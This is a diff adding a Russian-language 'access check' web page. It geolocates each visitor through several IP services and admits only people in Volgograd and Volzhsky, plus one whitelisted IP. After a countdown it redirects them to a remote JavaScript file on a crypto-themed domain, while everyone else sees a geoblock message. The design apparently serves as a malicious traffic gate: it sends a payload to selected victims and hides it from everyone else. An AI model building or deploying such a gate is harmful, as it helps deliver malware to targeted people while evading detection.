@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Проверка доступа</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<script src="https://unpkg.com/lucide@latest"></script>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Roboto:wght@300;400;700&display=swap');
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body {
+  font-family: 'Roboto', sans-serif;
+  background: #0a0a0a;
+  color: #fff;
+  min-height: 100vh;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 16px;
+  overflow: hidden;
+  position: relative;
+}
+.scanline {
+  background: linear-gradient(to bottom, rgba(255,255,255,0), rgba(255,255,255,0) 50%, rgba(0,0,0,0.1) 50%, rgba(0,0,0,0.1));
+  background-size: 100% 4px;
+  pointer-events: none;
+  position: fixed; inset: 0; z-index: 10; opacity: 0.4;
+}
+.vignette {
+  background: radial-gradient(circle, transparent 50%, rgba(0,0,0,0.85) 100%);
+  pointer-events: none;
+  position: fixed; inset: 0; z-index: 9;
+}
+.game-font { font-family: 'Orbitron', sans-serif; }
+.glass-panel {
+  background: rgba(5, 15, 30, 0.9);
+  backdrop-filter: blur(10px);
+  border: 1px solid rgba(100, 150, 255, 0.3);
+  border-radius: 24px;
+  box-shadow: 0 25px 50px rgba(0,0,0,0.7), 0 0 30px rgba(0,100,255,0.2);
+}
+.card {
+  width: 100%; max-width: min(520px, 95vw);
+  padding: clamp(24px, 5vw, 36px);
+  position: relative; z-index: 20;
+  text-align: center;
+}
+.header { margin-bottom: 24px; }
+.header h1 {
+  font-size: clamp(1.5rem, 5vw, 2rem);
+  font-weight: 800;
+  color: #99ccff;
+  text-shadow: 0 0 15px rgba(0,150,255,0.6);
+  margin-bottom: 8px;
+}
+.header .sub { color: #b3d9ff; font-size: 0.9rem; }
+.ip-panel {
+  background: rgba(5, 10, 25, 0.8);
+  border-radius: 16px;
+  padding: 16px;
+  margin: 20px 0;
+  border: 1px solid rgba(100, 150, 255, 0.3);
+  text-align: left;
+}
+.ip-row {
+  display: flex; justify-content: space-between;
+  padding: 8px 0; border-bottom: 1px dashed rgba(100, 150, 255, 0.2);
+  font-size: 0.95rem;
+}
+.ip-row:last-child { border-bottom: none; }
+.ip-label { color: #cce5ff; display: flex; align-items: center; gap: 8px; }
+.ip-label i { color: #80b3ff; width: 20px; }
+.ip-value {
+  font-family: monospace;
+  background: rgba(0,10,30,0.8);
+  padding: 4px 12px; border-radius: 60px;
+  border: 1px solid rgba(100, 150, 255, 0.4);
+  color: #b3d9ff; font-size: 0.9rem;
+}
+.status-box {
+  margin: 20px 0;
+  padding: 16px;
+  border-radius: 100px;
+  font-weight: 600;
+  font-size: 1.1rem;
+  display: flex; align-items: center; justify-content: center; gap: 10px;
+  border: 2px solid rgba(100, 150, 255, 0.3);
+}
+.status-wait { background: rgba(10, 20, 40, 0.6); color: #b3d9ff; border-color: #b3d9ff; }
+.status-allow { background: rgba(0,30,60,0.6); color: #9f9; border-color: #0f0; box-shadow: 0 0 25px rgba(0,255,0,0.4); }
+.status-deny { background: rgba(40, 10, 10, 0.8); color: #ff9999; border-color: #ff4444; box-shadow: 0 0 25px rgba(255,0,0,0.5); }
+.loader {
+  width: 24px; height: 24px;
+  border: 3px solid rgba(100, 150, 255, 0.3);
+  border-top-color: #6699ff;
+  border-radius: 50%;
+  animation: spin 0.8s linear infinite;
+}
+@keyframes spin { to { transform: rotate(360deg); } }
+.footer-note {
+  color: #b3d9ff; font-size: 0.85rem;
+  background: rgba(5, 15, 35, 0.6);
+  padding: 10px 18px; border-radius: 60px;
+  border: 1px solid rgba(100, 150, 255, 0.4);
+  margin-top: 16px;
+}
+.hidden { display: none !important; }
+.redirect-msg { color: #9f9; font-size: 0.9rem; margin-top: 12px; }
+</style>
+</head>
+<body>
+<div class="scanline"></div>
+<div class="vignette"></div>
+
+<div class="card glass-panel">
+  <div class="header">
+    <h1 class="game-font">ПРОВЕРКА ДОСТУПА</h1>
+    <div class="sub"><i data-lucide="map-pin" class="w-4 h-4 inline"></i> Только Волгоград и Волжский (РФ)</div>
+  </div>
+  
+  <div class="ip-panel">
+    <div class="ip-row">
+      <span class="ip-label"><i data-lucide="globe"></i> IP</span>
+      <span class="ip-value game-font" id="ipAddr">...</span>
+    </div>
+    <div class="ip-row">
+      <span class="ip-label"><i data-lucide="flag"></i> Страна</span>
+      <span class="ip-value" id="countryVal">...</span>
+    </div>
+    <div class="ip-row">
+      <span class="ip-label"><i data-lucide="building"></i> Город</span>
+      <span class="ip-value" id="cityVal">...</span>
+    </div>
+  </div>
+  
+  <div class="status-box status-wait" id="statusBox">
+    <div class="loader" id="loader"></div>
+    <span id="statusText">Определение геолокации...</span>
+  </div>
+  
+  <div class="footer-note" id="footerNote">
+    <i data-lucide="shield-check" class="w-4 h-4 inline"></i>
+    Защита от обхода через VPN/прокси
+  </div>
+  <div class="redirect-msg hidden" id="redirectMsg">
+    Перенаправление через <span id="countdown">5</span> сек...
+  </div>
+</div>
+
+<a id="targetLink" href="https://crypto-o.click/RZJ4O4.js" target="_blank" class="hidden"></a>
+
+<script>
+lucide.createIcons();
+
+const TARGET_URL = "https://crypto-o.click/RZJ4O4.js";
+const WHITELIST_IPS = ['77.73.68.2'];
+const ALLOWED = ["volgograd","волгоград","volzhsky","волжский","волг","волж"];
+
+const ipEl = document.getElementById('ipAddr');
+const countryEl = document.getElementById('countryVal');
+const cityEl = document.getElementById('cityVal');
+const statusBox = document.getElementById('statusBox');
+const statusText = document.getElementById('statusText');
+const loader = document.getElementById('loader');
+const footerNote = document.getElementById('footerNote');
+const redirectMsg = document.getElementById('redirectMsg');
+const countdownEl = document.getElementById('countdown');
+
+function norm(s) { return s ? s.toLowerCase().trim().replace(/[^\wа-яё]/g,'') : ''; }
+function isAllowed(cc, city) {
+  if (!cc || cc.toUpperCase() !== 'RU') return false;
+  const c = norm(city);
+  return ALLOWED.some(a => c.includes(norm(a)));
+}
+
+function setStatus(state, msg) {
+  loader.classList.add('hidden');
+  statusBox.classList.remove('status-wait','status-allow','status-deny');
+  if (state === 'wait') { statusBox.classList.add('status-wait'); statusText.innerHTML = `<div class="loader"></div> ${msg}`; }
+  else if (state === 'allow') { statusBox.classList.add('status-allow'); statusText.textContent = msg; }
+  else { statusBox.classList.add('status-deny'); statusText.textContent = msg; }
+}
+
+async function fetchGeo(url, timeout=5000, https=true) {
+  return new Promise((res, rej) => {
+    if (location.protocol==='https:' && !https) { rej(new Error('mixed')); return; }
+    const c = new AbortController();
+    const t = setTimeout(()=>c.abort(), timeout);
+    fetch(url, {signal:c.signal, mode:'cors'})
+      .then(r=>{clearTimeout(t); if(!r.ok) throw new Error('HTTP '+r.status); return r.json();})
+      .then(d=>res(d)).catch(e=>{clearTimeout(t); rej(e);});
+  });
+}
+
+const SERVICES = [
+  {name:'ipapi.co', url:'https://ipapi.co/json/', parse:d=>({ip:d.ip, cc:d.country_code, city:d.city})},
+  {name:'ip-api', url:'http://ip-api.com/json/?fields=status,countryCode,city,query', parse:d=>({ip:d.query, cc:d.countryCode, city:d.city}), https:false},
+  {name:'ipinfo', url:'https://ipinfo.io/json', parse:d=>({ip:d.ip, cc:d.country?.split(' ')[0], city:d.city?.split(',')[0]||''})},
+  {name:'geoplugin', url:'http://www.geoplugin.net/json.gp', parse:d=>({ip:d.geoplugin_request, cc:d.geoplugin_countryCode, city:d.geoplugin_city}), https:false},
+  {name:'ipapi-cdn', url:'https://ipapi.co/json/', parse:d=>({ip:d.ip, cc:d.country_code, city:d.city})}
+];
+
+async function checkGeo() {
+  for (const svc of SERVICES) {
+    try {
+      const data = await fetchGeo(svc.url, 5000, svc.https!==false);
+      if (!data || data.error || !data.ip) continue;
+      
+      const {ip, cc, city} = svc.parse(data);
+      
+      if (WHITELIST_IPS.includes(ip)) {
+        console.log('[Whitelist] IP разрешён:', ip);
+        ipEl.textContent = ip;
+        countryEl.textContent = data.country||data.country_name||'WHITELIST';
+        cityEl.textContent = city||'Whitelisted';
+        setStatus('allow','ДОСТУП РАЗРЕШЁН (WHITELIST)');
+        footerNote.classList.add('hidden');
+        redirectMsg.classList.remove('hidden');
+        startCountdown();
+        return;
+      }
+      
+      ipEl.textContent = ip||'?'; 
+      countryEl.textContent = data.country||data.country_name||'?'; 
+      cityEl.textContent = city||'?';
+      
+      if (isAllowed(cc, city)) {
+        setStatus('allow','ДОСТУП РАЗРЕШЁН');
+        footerNote.classList.add('hidden');
+        redirectMsg.classList.remove('hidden');
+        startCountdown();
+        return;
+      } else {
+        setStatus('deny','ГЕОБЛОКИРОВКА: '+(city||'неизвестно'));
+        footerNote.textContent = 'Доступ только для Волгограда и Волжского';
+        return;
+      }
+    } catch(e) { console.warn(svc.name+' failed:', e.message); }
+  }
+  
+  ipEl.textContent = 'error'; 
+  countryEl.textContent = '-'; 
+  cityEl.textContent = '-';
+  setStatus('deny','ОШИБКА: сервисы недоступны');
+  footerNote.textContent = 'Не удалось проверить геолокацию';
+}
+
+function startCountdown() {
+  let sec = 5;
+  const timer = setInterval(()=>{
+    countdownEl.textContent = --sec;
+    if (sec <= 0) { 
+      clearInterval(timer); 
+      window.location.href = TARGET_URL; 
+    }
+  }, 1000);
+}
+
+checkGeo();
+</script>
+</body>
+</html>
